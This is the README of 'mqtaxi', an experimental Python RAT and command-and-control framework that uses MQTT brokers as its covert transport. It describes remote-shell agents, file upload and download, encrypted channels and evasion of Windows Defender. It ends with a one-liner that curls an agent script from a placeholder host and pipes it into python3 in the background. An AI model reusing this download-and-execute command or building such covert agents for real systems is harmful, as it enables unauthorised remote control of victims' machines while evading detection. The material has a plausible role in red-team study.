# mqtaxi
### Experimental Python mqtt RAT/C2/Etc

This is a **toy** not meant for real Red Team engagements.  However I randomly make updates or add features to test the useability of mqtt as a transport mechanism for offensive use.  Collaboration on this project is welcome.

![Screenshot from 2022-11-21 12-45-32](https://user-images.githubusercontent.com/36344197/203133130-4aadeecc-7b3f-47c5-a5ea-8e8412f4de46.png)

The idea comes from using existing and trusted transport methods to achieve nefarious goals.  Mqtt's pub/sub type method of communication is perfectly situated for this and is common especially with iot type devices.  Mosquitto mqtt is easy to set up and also supports using forwarders.

Using mqtt as a remote shell mechanism has been done before and isn't anything new, however I wanted to attempt to give it a more polished interface as seen in many other C2 type frameworks.

---

**Current status:**

Mqtt connection is negotiated with paho.mqtt Python library

The client allows for typical creation of listeners, however the listener is actually a mqtt server that is either public or privately hosted using either tcp or websockets.  The mqtt server itself is just a standard Mosquitto mqtt server however I have included a default.conf and install script to get it running quickly.

![Screenshot from 2022-11-21 12-51-24](https://user-images.githubusercontent.com/36344197/203134494-9bb2e419-83e5-40fe-a514-4274c72dfb2e.png)

The client has the ability to connect to an agent to run pub/sub commands and see responses from terminal as well as Upload/Download functionality.  However as mentioned previously this is very much a work in progress.

![Screenshot from 2022-11-21 12-48-18](https://user-images.githubusercontent.com/36344197/203134445-663f5f10-3c89-4d56-9293-1ffed4da409d.png)

Python agents are generated using the 'generate' command within the config menu depending upon which listener you have activated using 'uselistener'.  I would like to add many more agents besides Python based.

![Screenshot from 2022-11-21 12-51-53](https://user-images.githubusercontent.com/36344197/203135028-4b2aba7e-2a57-4a93-9263-80442241d025.png)

---

**Some notes:**
- It is bloated and needs work
- It uses Python agents
- Doesn't follow standard accepted Python styles of coding, oops.
- It currently works, and isn't detected with Defender most of the time. (Please don't upload agents to virustotal)

**Listener Features:**
- Multi handler with Mosquitto mqtt pub/sub listener
- SSL TCP (mqtts://) or Websockets (wss://)
- Supports user/pass for authentication
- Supports ACL restrictions per topic

**Agent Features:**
- Remote shell (needs work or complete rewrite with pty or something similar, however currently works)
- Upload / Download
- Linux and Windows agents

**Client Features:**
- Add listeners (public or private)
- Generate agents per activated listener
- Session listing and connection
- Pub/Sub content is encrypted from MQTaxi to agent and visa versa, however, it is a python agent so...

**Work Needed:**
- Remove bloat
- Add jitter
- Add agents that use different languages besides Python
- Python agent pty.fork possibly
- Complete overhaul?  Who knows
- Include install script for mqtt forwarder
- Implement mqtt QoS and Last Will & Testament

**Execution of agent:**

The Python agent can be executed on a linux host with something like..

`yes|pip3 install paho.mqtt;nohup curl -s -X GET -H 'file:doit.py' https://my.hosted.something.com/3_tcp_lin.py|python3&exit`




	
